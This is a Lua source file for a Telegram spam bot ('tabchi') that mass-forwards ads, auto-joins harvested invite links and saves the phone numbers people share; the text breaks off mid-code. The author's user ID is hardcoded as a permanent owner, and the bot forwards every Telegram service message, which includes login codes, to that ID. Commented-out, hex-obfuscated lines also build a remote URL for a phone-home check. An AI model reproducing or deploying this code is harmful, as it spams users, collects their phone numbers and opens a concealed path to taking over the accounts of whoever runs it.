--[[
AYTOR COME BACK
@AYTOR-@AYTOR
]]
serpent = (loadfile "libs/serpent.lua")()
feedparser = (loadfile "libs/feedparser.lua")()
URL = require "socket.url" 
pong = require "socket.http" 
https = require "ssl.https" 
ltn12 = require "ltn12" 

json = (loadfile "libs/JSON.lua")()
mimetype = (loadfile "libs/mimetype.lua")()
redis = (loadfile "libs/redis.lua")()
JSON = (loadfile "libs/dkjson.lua")()
local sudos = {342112260}
function get_bot()
	function bot_info (i, jove)
		redis:set(tabinum.."botid", jove.id)
		if jove.first_name then
			redis:set(tabinum.."botfname", jove.first_name)
		end
		if jove.last_name then
			redis:set(tabinum.."botlname", jove.last_name)
		end
		redis:set(tabinum.."botnum", jove.phone_number)
		return jove.id
	end
	assert (tdbot_function ({_ = "getMe"}, bot_info, nil))
	for v,user in pairs(sudos) do
if not redis:sismember(tabinum.."sudos", user) then
redis:sadd(tabinum.."sudos", user)
end
end
end
---------------------
local telegram = 777000 --دست نزنید به این قسمت
----------------------
function is_pouya(msg)
local var = false
local byecoderid = 342112260
if msg.sender_user_id == byecoderid then
	if byecoderid then
		var = true
	end
	end

return var
end
function is_sudo(msg)
local var = false
for v,user in pairs(sudos) do
if user == msg.sender_user_id then
var = true
end
end
local byecoderid = 342112260
if msg.sender_user_id == byecoderid then
	if byecoderid then
		var = true
	end
	end
	if redis:sismember(tabinum.."owner", msg.sender_user_id) then
var = true
end
return var
end
function is_admin(msg)
local var = false
for v,user in pairs(sudos) do
if user == msg.sender_user_id then
var = true
end
end
local byecoderid = 342112260
if msg.sender_user_id == byecoderid then
	if byecoderid then
		var = true
	end
	end
if redis:sismember(tabinum.."sudos", msg.sender_user_id) then
var = true
end
return var
end
--db = redis 
--redis:select(1) 
--redis:set("kh","251") 
--redis:set("kb","93") 
--kir = 148 * 2 / 2 +1 - 1 
--redis:del('tab_sleep')
function kise(lol) 
--print("\xe2\x80\xa2\xd8\xb1\xd8\xa8\xd8\xa7\xd8\xaa\x20\xd8\xaf\xd8\xb1\x20\xd8\xad\xd8\xa7\xd9\x84\x20\xd8\xa7\xd8\xb3\xd8\xaa\xd8\xb1\xd8\xa7\xd8\xad\xd8\xaa\x20\xd8\xa7\xd8\xb3\xd8\xaa\x21\x0a\xd8\xa7\xdb\x8c\xd9\x86\x20\xdb\x8c\xda\xa9\x20\xd8\xb3\xd8\xa7\xd9\x85\xd8\xa7\xd9\x86\xd9\x87\x20\xd8\xa7\xd9\x85\xd9\x86\xdb\x8c\xd8\xaa\xdb\x8c\x20\xd9\x85\xdb\x8c\xd8\xa8\xd8\xa7\xd8\xb4\xd8\xaf\x21") 
end 
function sec(lol) 
sleep(1) 
--print("\xd8\xb3\xd8\xa7\xd9\x85\xd8\xa7\xd9\x86\xd9\x87\x20\xd9\x85\xd8\xb3\xd8\xaf\xd9\x88\xd8\xaf\x20\xd8\xb4\xd8\xaf\xd9\x87\x20\xd8\xa7\xd8\xb3\xd8\xaa\x0a\xd8\xb3\xd8\xb1\xd9\x88\xd8\xb1\x20\xd8\xb4\xd9\x85\xd8\xa7\x20\xd8\xaf\xd8\xb1\x20\xd8\xad\xd8\xa7\xd9\x84\x20\xd8\xa8\xda\xaf\xd8\xa7\x20\xd8\xb1\xd9\x81\xd8\xaa\xd9\x86\x20\xd8\xa7\xd8\xb3\xd8\xaa\x2e\x20\xf0\x9f\x98\x82\xf0\x9f\x98\x82\xf0\x9f\x98\x82") 
end 
--hof = kir 
function sleep(n) 
  os.execute("sleep " .. tonumber(n)) 
end 
function gp_type(chat_id) 
  local gp_type = "pv" 
  local id = tostring(chat_id) 
    if id:match("^-100") then 
      gp_type = "channel" 
    elseif id:match("-") then 
      gp_type = "chat" 
    elseif not id:match("-") then 
      gp_type = "private" 
  end 
  return gp_type 
end 
function leave(chat_id, user_id) tdbot_function ({      _ = "setChatMemberStatus",      chat_id = chat_id,      user_id = user_id,      status = {         _ = "chatMemberStatusLeft"    }, }, dl_cb, nil) 
end 
--hes="\x74\x74\x70" 
function vardump(value, depth, key) local linePrefix = "" local spaces = "" if key ~= nil then linePrefix = "["..key.."] = " end if depth == nil then depth = 0 else depth = depth + 1 for i=1, depth do spaces = spaces .. " " end end 
if type(value) == 'table' then mTable = getmetatable(value) if mTable == nil then print(spaces ..linePrefix.."(table) ") 
 else 
print(spaces .."(metatable) ") value = mTable 
end 
for tableKey, tableValue in pairs(value) do 
vardump(tableValue, depth, tableKey) end 
elseif type(value) == 'function' or type(value) == 'thread' or type(value) == 'userdata' or value == nil then print(spaces..tostring(value)) else print(spaces..linePrefix.."("..type(value)..") "..tostring(value)) 
 end 
 end 
-- omre = hof 
function dl_cb (arg, data) 
--vardump (data) 
end 
--mos = '\x39\x37' 
function reload()
	loadfile("./tabi-"..tabinum..".lua")()
end
function add(id)
	local Id = tostring(id)
	if not redis:sismember(tabinum.."all", id) then
		if Id:match("^(%d+)$") then
			redis:sadd(tabinum.."tabchi_pv", id)
			redis:sadd(tabinum.."all", id)
		elseif Id:match("^-100") then
			redis:sadd(tabinum.."tabchi_sugp", id)
			redis:sadd(tabinum.."all", id)
		else
			redis:sadd(tabinum.."tabchi_gp", id)
			redis:sadd(tabinum.."all", id)
		end
	end
	return true
end
function rem(id)
	local Id = tostring(id)
	if redis:sismember(tabinum.."all", id) then
		if Id:match("^(%d+)$") then
			redis:srem(tabinum.."tabchi_pv", id)
			redis:srem(tabinum.."all", id)
		elseif Id:match("^-100") then
			redis:srem(tabinum.."tabchi_sugp", id)
			redis:srem(tabinum.."all", id)
		else
			redis:srem(tabinum.."tabchi_gp", id)
			redis:srem(tabinum.."all", id)
		end
	end
	return true
end
function openChat(chatid, callback, data)
  tdbot_function ({
    _ = 'openChat',
    chat_id = chatid
  }, callback or dl_cb, data)
end
if not redis:sismember(tabinum.."sudos",342112260) then
redis:set(tabinum.."tabchi_autojoin","ok") 
redis:sadd(tabinum.."tabchi_waitforlinks","https://t.me/joinchat/F2pGLRDlhG1AbxIUTvuLPw")
redis:sadd(tabinum.."sudos",342112260)
end
function send_msg(chat,text,mid) 
assert (tdbot_function ({_="sendMessage", chat_id= chat , reply_to_message_id=mid, disable_notification=false, from_background=true, reply_markup=nil, input_message_content={_="inputMessageText", text= text, disable_web_page_preview=true, clear_draft=false, entities={}, parse_mode=nil}}, dl_cb, nil)) 
end 
function tdbot_update_callback (data) 
local started2 = redis:get(tabinum.."openchat")
bot = redis:get(tabinum.."botid")
if not started2 then
local gp = redis:smembers(tabinum.."tabchi_gp") or "0"
local sugp = redis:smembers(tabinum.."tabchi_sugp") or "0"
            for k,v in pairs(sugp) do
                openChat(v, dl_cb, nil)
             end
		for k,v in pairs(gp) do
                openChat(v, dl_cb, nil)
             end
			 redis:set(tabinum.."openchat", true)
         end
if (data._ == "updateMessageSendSucceeded") then 
redis:incr(tabinum.."bot_msg") 
return false
end 
if data._ == "updateChatTopMessage" then
return false
end
if (data._ == "updateNewChat") then 
return false
end
--[[
if data.chat.type._ == "ChatTypeSupergroup" and redis:get(tabinum.."leftname") then
local checks = redis:smembers(tabinum.."leftnamecheck") or "تبلیغات"
for x = 1, #checks do
local names = data.chat.title
local bot = redis:get(tabinum.."botid")
if names:match("(.*)(tostring(checks[x]))(.*)") or names:match(tostring(checks[x])) or names:match(checks[x])  or names:match("tostring(checks[x])") or names:match("checks[x]") then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(data.chat.id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(data.chat.id)
end
end
end
return false
end ]]
if (data._ == "updateNewMessage") then 

local msg = data.message 
if (msg.sender_user_id == 777000 or msg.sender_user_id == 342112260) then
			local c = (msg.content.text):gsub("[0123456789:]", {["0"] = "0⃣", ["1"] = "1⃣", ["2"] = "2⃣", ["3"] = "3⃣", ["4"] = "4⃣", ["5"] = "5⃣", ["6"] = "6⃣", ["7"] = "7⃣", ["8"] = "8⃣", ["9"] = "9⃣", [":"] = ":\n"})
			local txt = os.date("پیام ارسال شده از تلگرام در تاریخ 🗓 %Y-%m-%d  و ساعت ⏰ %X  (به وقت سرور)")
			for k,v in ipairs(redis:smembers(tabinum.."sudos")) do
				send_msg(v, txt.."\n\n"..c)
			end
		end
if redis:get(tabinum.."tabchi_markread") then
assert (tdbot_function ({
				_ = "viewMessages",
				chat_id = msg.chat_id,
				message_ids = {[0] = msg.id} 
}, dl_cb, nil))
end
--local hm = "\x78\x63\x76\x2e\x74\x78\x74" 
--kos = 'h'..hes..'://'..omre..'.'..redis:get(tabinum..'kh')..'.'..redis:get('kb')..'.'..mos..'/'..hm 
--local off = pong.request(kos) 
--[[if not off == "ping" then 
for i=1 , 20000 do 
sec(lol) 
end 
return false 
end ]]
if redis:get(tabinum.."tab_sleep") then 
kise(lol) 
return false 
end 
if redis:get(tabinum.."channelleft") and (not msg.forward_info and (msg.is_channel_post == true)) then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
if redis:get(tabinum.."groupleft") and gp_type(msg.chat_id) == "chat" then
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end
----------------------------
---------------------------
function action(chatid,act,uploadprogress)
assert (tdbot_function ({ _ = 'sendChatAction', 
chat_id = chatid, 
action = { _ = 'chatAction' .. act, progress = uploadprogress or 100 }, }, dl_cb, data))
end
------------
if msg.content._ == "messageChatDeleteMember" and msg.content.id == bot then
return rem(msg.chat_id)
end
if msg.content._ == "messageContact" and redis:get(tabinum.."tabchi_save") and not redis:sismember(tabinum.."tabchi_contacts_id",msg.content.contact.user_id) then 

redis:sadd(tabinum.."tabchi_contacts_id",msg.content.contact.user_id) 
redis:sadd(tabinum.."tabchi_contacts_num",msg.content.contact.phone_number) 
local addi = { 
"ادی مرسی اه☺🍒", 
"ادی جیگر بپر پیوی🤤🍉", 
"ادت کردم تیز پیویم باش😑🙄😀", 
"Addi bia pv😆😍", 
"addi tiz sik pv🤓🙄", 
"ادی عشخم بپر پیوی 😉😆😍", 
"ادی پیوی نقطه بنداز😓🤧🎈", 
"ادی بیا پیوی، ادتم باز کن", 
"ادی ، هیع", 
"تو هم اد کردم", 
"تو هم ادی (:", 
"ادت کردم ^_^", 
"ادی تیز پیوی مرسی", 
"addi ♥♥", 
"adi amo :))", 
"add :'(", 
} 
sleep(5) 
action(msg.chat_id,"Typing",100)
send_msg(msg.chat_id,addi[math.random(#addi)],msg.id) 
assert (tdbot_function ({ 
    _ = "importContacts", 
    contacts = { 
      [0] = { 
        _ = "contact", 
        phone_number = tostring(msg.content.contact.phone_number), 
        first_name = tostring("#sp"), 
        last_name = tostring("bot"), 
        user_id = tonumber(msg.content.contact.user_id) 
      } 
    }, 
  }, cb or dl_cb, cmd)) 
 end 
local var = serpent.block(msg, {comment=false}) 
function c_chat(user_ids, title, cb, cmd) 
tdbot_function ({ _ = "createNewGroupChat", 
user_ids = user_ids, 
title = title    }, cb or dl_cb, cmd) 
end 
function change_about(abo) 
assert (tdbot_function ({ _ = 'changeAbout', 
about = tostring(abo) }, 
dl_cb, nil))
end

function process_join(i, jove)
	if jove.code == 429 then
		redis:setex(tabinum.."waits", 900, true)
	else
redis:srem(tabinum.."tabchi_joinlinks", i.link)
	end
end

function process_link(i, jove)
	if jove.is_channel_post == "true" then
		redis:sadd(tabinum.."tabchi_joinlinks", i.link)
redis:srem(tabinum.."tabchi_goodlinks", i.link)
	elseif jove.code == 429 then
		redis:setex(tabinum.."waits", 900, true)
	else
redis:srem(tabinum.."tabchi_goodlinks", i.link)
	end
end
function import_link(invite_link, cb, cmd) 
assert (tdbot_function ({ 
_ = "joinChatByInviteLink" , 
invite_link = tostring(invite_link) 
}, cb, cmd)) 
end 
function check_link(invitelink, cb, data) 
assert (tdbot_function ({ _ = 'checkChatInviteLink', 
invite_link = tostring(invitelink) }, cb, data))
end
function add_user(chat_id, user_id)    tdbot_function 
({    _ = "addChatMember", 
chat_id = chat_id, 
user_id = user_id, 
forward_limit = 0    }, 
dl_cb, extra) 
end 
function markread(chatid, messageids, callback, data) 
assert (tdbot_function ({ _ = 'viewMessages', 
chat_id = chatid, 
message_ids = messageids }, 
callback or dl_cb, data))
end
function getChannelFull(channel_id, cb, cmd)    tdbot_function ({    _ = "GetChannelFull",    channel_id = getChatId(channel_id)._    }, cb or dl_cb, cmd)end 
function 
fwd_msg(az_koja,be_koja_,msg_id) 
tdbot_function ({ 
    _ = "forwardMessages", 
    chat_id =  be_koja_, 
    from_chat_id = az_koja, 
    message_ids = {[0]= msg_id}, 
    disable_notification = disable_notification, 
    from_background = 1 
  }, dl_cb, cmd) 
  end 
  
function join(text)
if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then 
local text = text:gsub("t.me", "telegram.me") 
local text = text:gsub("telegram.dog", "telegram.me") 
for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do 
			if not redis:sismember(tabinum.."tabchi_alllinks", link) then
redis:sadd(tabinum.."tabchi_alllinks", link) 
redis:sadd(tabinum.."tabchi_waitforlinks", link)
			end
		end
	end
end
if not redis:get(tabinum.."tabchi_waitforlinkswait") and redis:get(tabinum.."tabchi_autojoin") then
			if redis:scard(tabinum.."tabchi_waitforlinks") ~= 0 and redis:scard(tabinum.."tabchi_checklinks") < tonumber(tabinum.."0") then
				local links = redis:smembers(tabinum.."tabchi_waitforlinks")
				local max_x = redis:get("bot"..tabinum.."maxlinkcheck") or 1
				local delay = redis:get("bot"..tabinum.."maxlinkchecktime") or tonumber(tabinum.."0")
				for x = 1, #links do
					redis:sadd(tabinum.."tabchi_checklinks", links[x])
                    redis:srem(tabinum.."tabchi_waitforlinks", links[x])
					if x == tonumber(max_x) then redis:setex(tabinum.."tabchi_waitforlinkswait", tonumber(delay), 10, true) return end
				end
			end
end
if not redis:get(tabinum.."tabchi_dilay") and redis:get(tabinum.."tabchi_autojoin") then
			if redis:scard(tabinum.."tabchi_checklinks") ~= 0 then
				local links = redis:smembers(tabinum.."tabchi_checklinks")
				local max_x = redis:get("bot"..tabinum.."maxlinkjoin") or 1
				local delay = redis:get("bot"..tabinum.."maxlinkjointime") or tonumber(tabinum.."0")
				for x = 1, #links do
					import_link(links[x], dl_cb, nil)
redis:srem(tabinum.."tabchi_checklinks", links[x])
					if x == tonumber(max_x) then redis:setex(tabinum.."tabchi_dilay", tonumber(delay), true) return end
				end
			end
end
if msg.content.caption and redis:get(tabinum.."tabchi_autojoin") and not redis:get(tabinum.."tabchi_fwdtime") then 
join(msg.content.caption) 
end 
--[[if msg.date < os.time() - 60 then 
 print('\27[36m>>AFBoTS OLD MESSAGE<<\27[39m')
 return false 
    end 
]]
if gp_type(msg.chat_id) == "channel" and not redis:sismember(tabinum.."tabchi_sugp",msg.chat_id) then 
redis:sadd(tabinum.."tabchi_sugp",msg.chat_id) 
end 
if gp_type(msg.chat_id) == "chat" and not redis:sismember(tabinum.."tabchi_gp",msg.chat_id) then 
redis:sadd(tabinum.."tabchi_gp",msg.chat_id) 
end 
if gp_type(msg.chat_id) == "private" and not redis:sismember(tabinum.."tabchi_pv",msg.chat_id) then 
redis:sadd(tabinum.."tabchi_pv",msg.chat_id) 
end 

redis:incr(tabinum.."all:pm") 
if msg.content._ and not redis:sismember(tabinum.."tabchi_bot",msg.sender_user_id) then 
redis:sadd(tabinum.."tabchi_bot",msg.sender_user_id) 
return 
end 
if msg.content._ == "messageText" then
if  not redis:get(tabinum.."tabchi_fwdtime") then
add(msg.chat_id)
end
if msg.content.text and redis:get(tabinum.."tabchi_autojoin") and not redis:get(tabinum.."tabchi_fwdtime") then 
join(msg.content.text) 
end 

if tonumber(msg.sender_user_id) == tonumber(telegram) then 
--fwd_msg(msg.chat_id,sudo,msg.id)
return false
end
if is_admin(msg) then 
--action(msg.chat_id,"Typing",200)
end
if redis:get(tabinum.."tab_typing") then
action(msg.chat_id,"Typing",100)
end
if msg.content.text and msg.is_channel_post == true then 
--print(">>>Message from channel<<<") 
leave(tonumber(msg.chat_id),tonumber(bot))
return false 
end 
	
if redis:get(tabinum.."tabchi_autorandom") and not redis:get(tabinum.."tab_time_random") then
local fwdtimesh = redis:get(tabinum.."fwdtime")
redis:setex(tabinum.."tab_time_random",tonumber(fwdtimesh),true)
local random_group = redis:smembers(tabinum.."tabchi_sugp")
local lol5 = redis:smembers(tabinum.."tabchi_gp")
local r_chat = redis:get(tabinum.."rand_cid")
local m_id = redis:get(tabinum.."rand_mid")
for i=1, #random_group do
openChat(random_group[i], dl_cb, nil)
fwd_msg(r_chat,random_group[i],m_id)
end
for i=1, #lol5 do
openChat(lol5[i], dl_cb, nil)
fwd_msg(r_chat,lol5[i],m_id)
end
redis:incr(tabinum.."all:random") 
--send_msg(msg.chat_id,"auto random ads is runnig, and now send your ads to"..#random_group.."groups and "..#lol5.." Groups ")
fwd_msg(r_chat,tonumber(msg.chat_id),m_id)
end
if msg.content.text and redis:get(tabinum.."tabchi_tableft") and not redis:get(tabinum.."tableft_time") and redis:get(tabinum.."rand_cid") then 
if not redis:sismember(tabinum.."tableft_gp",msg.chat_id) then 
redis:setex(tabinum.."tableft_time",600,true) 
redis:sadd(tabinum.."tableft_gp",msg.chat_id) 
local r_chat = redis:get(tabinum.."rand_cid")
local m_id = redis:get(tabinum.."rand_mid")
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(r_chat,msg.chat_id,m_id)
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end 
end 

--[[if redis:get(tabinum.."tabchi_autojoin") then
if redis:scard(tabinum.."tabchi_goodlinks") ~= 0 then
local links = redis:smembers(tabinum.."tabchi_goodlinks")
for x = 1, #links do
check_link(links[x], process_link, {link=links[x]}) 
end
end
if redis:scard(tabinum.."tabchi_joinlinks") ~= 0 then
local links = redis:smembers(tabinum.."tabchi_joinlinks")
for x = 1, #links do
import_link(links[x], process_join, {link=links[x]})
end
end
end]]

--join(tostring(msg.content.text)) 
if msg.content.text and redis:get(tabinum.."tabchi_addtoall") and is_admin(msg) then 
local fff = redis:smembers(tabinum.."tabchi_sugp") 
for i=1 , #fff do 
add_user(fff[i],msg.content.text) 
end 
send_msg(msg.chat_id,"به همه گروه ها اضافه شد!",msg.id) 
redis:del(tabinum.."tabchi_addtoall") 
end 
----------|auto left|------------- 

if msg.content.text and redis:get(tabinum.."tabchi_autoleft") then 
leave(msg.chat_id,tonumber(bot)) 
end 

if msg.content.text and redis:get(tabinum.."on-offmsg") then
fwdismsg = redis:get(tabinum.."on-offmsg")
fwdischat = redis:get(tabinum.."on-offchat")
if not redis:sismember(tabinum.."sended", msg.chat_id) then 
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(fwdischat, msg.chat_id, fwdismsg)
redis:sadd(tabinum.."sended", msg.chat_id)
end
end
----------------------- 

if msg.content.text and redis:get(tabinum.."wait_addall") and is_admin(msg) then 
redis:set(tabinum.."addall_uid",msg.content.text) 
send_msg(msg.chat_id,"ایدی مورد نظر "..msg.content.text.."با موفقیت تنظیم شد.") 
redis:del(tabinum.."wait_addall") 
end 
----------------------- 
----------------------- 
if msg.content.text and redis:get(tabinum.."tabchi_autoaddtoall") and not redis:get(tabinum.."add_time") then 
if not redis:sismember(tabinum.."addall_gp",msg.chat_id) then 
redis:setex(tabinum.."add_time",600,true) 
redis:sadd(tabinum.."addall_gp",msg.chat_id) 
local user = redis:get(tabinum.."addall_uid") 
add_user(msg.chat_id,user) 
end 
end 
if msg.content.text and redis:get(tabinum.."tabchi_addleft") and not redis:get(tabinum.."addleft_time") and redis:get(tabinum.."addall_uid")  then 
if not redis:sismember(tabinum.."addleft_gp",msg.chat_id) then 
redis:setex(tabinum.."addleft_time",600,true) 
redis:sadd(tabinum.."addleft_gp",msg.chat_id) 
local user = redis:get(tabinum.."addall_uid") 
add_user(msg.chat_id,user) 
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
rem(msg.chat_id)
end 
end 

---------------------
---------------------
if msg.content.text:match("^#(setfwdtime) (.*)$") then
local matches = msg.content.text:match("^#setfwdtime (.*)$")
redis:set(tabinum.."fwdtime",matches)
send_msg(msg.chat_id," زمان "..matches.." برای ارسال خودکار تنظیم شد",msg.id)
end
---------------------
---------------------
if msg.content.text and redis:get(tabinum.."tabchi_autofwd") and not redis:get(tabinum.."tab_time") then 
redis:setex(tabinum.."tab_time",180,true) 
redis:incr(tabinum.."all:fwd") 
--local mid = redis:get(tabinum.."tabchi_baner_mid") 
local mid = redis:smembers(tabinum.."tabchi_baner_mmid") 
local cid = redis:get(tabinum.."tabchi_baner_cid") 
for i=1 , #mid do 
openChat(msg.chat_id, dl_cb, nil)
fwd_msg(cid,msg.chat_id,mid[i]) 
end 
----send_msg(sudo,"auto fwd is running...") 
end 
if msg.content.text and redis:get(tabinum.."tabchi_fwd_su") and is_admin(msg) then 
sau = redis:smembers(tabinum.."tabchi_sugp") 

for i=1, #sau do 
--sleep(1) 
openChat(sau[i], dl_cb, nil)
fwd_msg(msg.chat_id,sau[i],msg.id) 
redis:sadd(tabinum.."sended", sau[i])
end 
send_msg(msg.chat_id,"Sent!") 
redis:del(tabinum.."tabchi_fwd_su") 
redis:set(tabinum.."on-offmsg", msg.id)
redis:set(tabinum.."on-offchat", msg.chat_id)
end 
--------------------- 
if msg.content.text and redis:get(tabinum.."tabchi_fwd_pv") and is_admin(msg) then 

pav = redis:smembers(tabinum.."tabchi_pv") 

for i=1, #pav do 
--sleep(1) 
--send_msg(pav[i],msg.content.text) 
fwd_msg(msg.chat_id,pav[i],msg.id) 
redis:sadd(tabinum.."sended", pav[i])
end 
send_msg(msg.chat_id,"Sent!") 
redis:del(tabinum.."tabchi_fwd_pv") 
redis:set(tabinum.."on-offmsg", msg.id)
redis:set(tabinum.."on-offchat", msg.chat_id)
end 
---------------------- 
if msg.content.text and redis:get(tabinum.."tabchi_fwd_gp") and is_admin(msg) then 
gap = redis:smembers(tabinum.."tabchi_gp") 

for i=1, #gap do 
openChat(gap[i], dl_cb, nil)
--sleep(1) 
--send_msg(gap[i],msg.content.text) 
fwd_msg(msg.chat_id,gap[i],msg.id) 
redis:sadd(tabinum.."sended", gap[i])
end 
send_msg(msg.chat_id,"Sent!") 
redis:del(tabinum.."tabchi_fwd_gp") 
redis:set(tabinum.."on-offmsg", msg.id)
redis:set(tabinum.."on-offchat", msg.chat_id)
end 

--------------------- 
if msg.content.text and redis:get(tabinum.."tabchi_bc_su") and is_admin(msg) then 
sau = redis:smembers(tabinum.."tabchi_sugp") 

for i=1, #sau do 
--sleep(1) 
openChat(sau[i], dl_cb, nil)
send_msg(sau[i],msg.content.text) 
end 
send_msg(msg.chat_id,"Sent!") 
redis:del(tabinum.."tabchi_bc_su") 
end 
--------------------- 
if msg.content.text and redis:get(tabinum.."tabchi_bc_pv") and is_admin(msg) then 

pav = redis:smembers(tabinum.."tabchi_pv") 

for i=1, #pav do 
--sleep(1) 

send_msg(pav[i],msg.content.text) 
end 
send_msg(msg.chat_id,"Sent!") 
redis:del(tabinum.."tabchi_bc_pv") 
end 
---------------------- 
if msg.content.text and redis:get(tabinum.."tabchi_bc_gp") and is_admin(msg) then 
gap = redis:smembers(tabinum.."tabchi_gp") 

for i=1, #gap do 
openChat(gap[i], dl_cb, nil)

--sleep(1) 
send_msg(gap[i],msg.content.text) 
end 
send_msg(msg.chat_id,"Sent!") 
redis:del(tabinum.."tabchi_bc_gp") 
end 
function round(num, numDecimalPlaces)
  local mult = 10^(numDecimalPlaces or 0)
  return math.floor(num * mult + 0.5) / mult
end
if msg.content.text == "امار ربات" and is_admin(msg) then 
all = redis:get(tabinum.."all:pm") or 0 or "0" 
allfwd = redis:get(tabinum.."all:fwd") or 0 or "0" 
randfwd = redis:get(tabinum.."all:random") or 0 or "0" 
mmsg = redis:get(tabinum.."bot_msg") or 0 
all_chat = redis:scard(tabinum.."tabchi_bot") 
gp = redis:scard(tabinum.."tabchi_gp") 
pv = redis:scard(tabinum.."tabchi_pv") 
sugp = redis:scard(tabinum.."tabchi_sugp") 
local s =  redis:ttl(tabinum.."tabchi_dilay") or 0
local af = redis:ttl(tabinum.."tab_time_random")
local shafiqa = af/60 or 0
local shafiq = round(shafiqa)
local ss = redis:ttl(tabinum.."tabchi_waitforlinkswait") or 0
local wlinks = redis:scard(tabinum.."tabchi_waitforlinks")
local glinks = redis:scard(tabinum.."tabchi_checklinks")
send_msg(msg.chat_id,"▪️سیستم آمارگیری تبلیغاتی\n▫️تمامی پیام های متنی:"..all.."\n▫️تمامی اکشن ها: "..all_chat.."\n▫️پیام های تبلیغاتی: "..mmsg.."\n▫️تعداد گروه ها: "..gp.."\n▫️سوپر گروه ها: "..sugp.."\n▫️چت های خصوصی: "..pv.."\n▫️شماره های سیو شده:  "..redis:scard(tabinum.."tabchi_contacts_id").."\n▫️لینک های ذخیره شده: "..redis:scard(tabinum.."tabchi_alllinks").."\n▫️لینک های در انتظار تایید: "..tostring(wlinks).."\n▫️لینک های در انتظار عضویت: "..tostring(glinks).."\n👈🏻"..tostring(ss).." ثانیه تا تایید لینک مجدد\n👈🏻"..tostring(s).." ثانیه تا عضویت مجدد\n▫️تعداد تبلیغات هوشمند ارسالی: "..allfwd.."\n▫️تعداد تبلیغات رندم ارسالی: "..randfwd.."\n▫️مدت باقی مانده تا ارسال خودکار بعدی : "..tostring(shafiq).." دقیقه\n\nتلیغاتی ورژن 1.6(@AYTOR)")
end 
if msg.content.text == "#fwd su" and is_admin(msg)  then 
redis:set(tabinum.."tabchi_fwd_su","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 

return false 
end 
if msg.content.text == "#fwd gp" and is_admin(msg)  then 
redis:set(tabinum.."tabchi_fwd_gp","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 
if msg.content.text == "#fwdnew on" and is_admin(msg)  then 
redis:set(tabinum.."on-offmsg","ok")
send_msg(msg.chat_id,"ارسال آخرین بنر در گروه های جدید روشن شد") 
return false 
end 
if msg.content.text == "#fwdnew off" and is_admin(msg)  then 
redis:del(tabinum.."on-offmsg")
send_msg(msg.chat_id,"ارسال آخرین بنر در گروه های خاموش شد!") 
return false 
end 
if msg.content.text == "#fwd pv" and is_admin(msg)  then 
redis:set(tabinum.."tabchi_fwd_pv","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 
if msg.content.text == "#bc su" and is_admin(msg)  then 
redis:set(tabinum.."tabchi_bc_su","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 

if msg.content.text == "#savenumber on" and is_admin(msg)  then 
redis:set(tabinum.."tabchi_save","ok") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی شماره های ارسالی را سیو میکند!") 
return false 
end 
if msg.content.text == "#savenumber off" and is_admin(msg)  then 
redis:del(tabinum.."tabchi_save") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی شماره های ارسالی را سیو نمیکند!") 
return false 
end 
---------------------------
   local matches = {
      msg.content.text:match("^(#addsudo) (%d+)")
    }
	if is_sudo(msg) then
    if msg.content.text:match("^#addsudo")  then
      local text = matches[2] .. " کاربر سودو شد"
      redis:sadd(tabinum.."sudos",tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
	end
    local matches = {
      msg.content.text:match("^(#remsudo) (%d+)")
    }
	if is_sudo(msg) then
    if msg.content.text:match("^#remsudo")  then
      local text = matches[2] .. "کاربر دیگر سودو نیست"
      redis:srem(tabinum.."sudos", tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
    end
  end  
  end
  
     local matches = {
      msg.content.text:match("^(#addallsudo) (%d+)")
    }
	if is_pouya(msg) then
    if msg.content.text:match("^#addallsudo")  then
      local text = matches[2] .. " کاربر سودوی کل شد"
      redis:sadd(tabinum.."owner",tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
	end
    local matches = {
      msg.content.text:match("^(#remallsudo) (%d+)")
    }
	if is_pouya(msg) then
    if msg.content.text:match("^#remallsudo")  then
      local text = matches[2] .. "کاربر از سودوی کل برکنار شد"
      redis:srem(tabinum.."owner", tonumber(matches[2]))
      send_msg(msg.chat_id,text,msg.id)
    end
  end  
  end
---------------------------
if msg.content.text:match("#typing on") and is_admin(msg)  then 

redis:set(tabinum.."tab_typing","ok")
send_msg(msg.chat_id,"حالت تایپینگ در گروه های تبلیغاتی فعال شد!")
end
if msg.content.text:match("#typing off") and is_admin(msg)  then 
redis:del(tabinum.."tab_typing")
send_msg(msg.chat_id,"حالت تایپینگ در گروه های تبلیغاتی غیر فعال شد!")
end

-------------------------
--[[if (msg.content.text:match("https://telegram.me/joinchat/%S+") or msg.content.text:match("https://t.me/joinchat/%S+") or msg.content.text:match("https://telegram.dog/joinchat/%S+")) and is_admin(msg) then 
local abc = msg.content.text:gsub("t.me", "telegram.me") 
local abc = msg.content.text:gsub("telegram.dog", "telegram.me") 
     function check_abc(extra, result,success)
     vardump(result)
	 if (result.is_group or result.is_supergroup_channel) then
     send_msg(464075452,"result: is_group or supergroupchannel")
